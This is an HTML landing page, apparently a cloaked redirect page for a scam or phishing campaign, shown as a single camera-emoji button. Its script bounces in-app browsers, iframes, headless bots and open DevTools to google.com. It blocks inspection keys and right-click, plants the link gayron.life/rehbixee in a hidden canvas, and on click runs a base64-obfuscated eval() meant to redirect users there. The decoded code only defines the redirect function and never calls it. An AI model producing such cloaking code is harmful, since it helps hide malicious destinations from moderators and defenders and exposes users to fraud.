<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>📷</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .btn {
      background-color: white;
      color: black;
      border: none;
      border-radius: 9999px;
      padding: 1.5rem 3rem;
      font-size: 2rem;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }
    canvas.ocr-bait {
      display: none;
    }
  </style>
</head>
<body>
  <button class="btn" onclick="go()">📷</button>
  <canvas class="ocr-bait" id="ocr"></canvas>

  <script>
    // 🔐 Защита от встроенных браузеров, iframe и headless
    (function() {
      const ua = navigator.userAgent.toLowerCase();
      const suspiciousAgents = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
      const isWebview = suspiciousAgents.some(agent => ua.includes(agent));

      if (isWebview || window.top !== window.self || navigator.webdriver || navigator.plugins.length === 0 || !navigator.languages) {
        location.href = "https://google.com";
      }
    })();

    // 👁️ OCR bait
    (function() {
      const canvas = document.getElementById("ocr");
      const ctx = canvas.getContext("2d");
      canvas.width = 300;
      canvas.height = 80;
      ctx.font = "20px Arial";
      ctx.fillStyle = "black";
      ctx.fillText("https://gayron.life/rehbixee", 10, 50);
    })();

    // 🎯 Проверка взаимодействия пользователя
    let interacted = false;
    document.addEventListener("mousemove", () => interacted = true);
    document.addEventListener("touchstart", () => interacted = true);
    document.addEventListener("keypress", () => interacted = true);

    // 🧱 DevTools detection (активный)
    setInterval(() => {
      if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
        location.href = "https://google.com";
      }
    }, 500);

    // ⛔️ Блок DevTools клавиш и правой кнопки
    document.addEventListener("contextmenu", e => e.preventDefault());
    document.onkeydown = e => {
      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
    };

    // 🧬 Шифрованный редирект
    function go() {
      if (!interacted) return;
      setTimeout(() => {
        const parts = [
          "ZnVuY3",
          "Rpb24gcG",
          "F5bG9hZCgp",
          "IHt3aW5kb3cu",
          "bG9jYXRpb24ua",
          "HJlZiA9ICdodHRwczovL2dheXJvbi5saWZlL3JlaGJpeGVlJzt9"
        ];
        eval(atob(parts.join('')));
      }, Math.random() * 1000 + 1500);
    }
  </script>
</body>
</html>
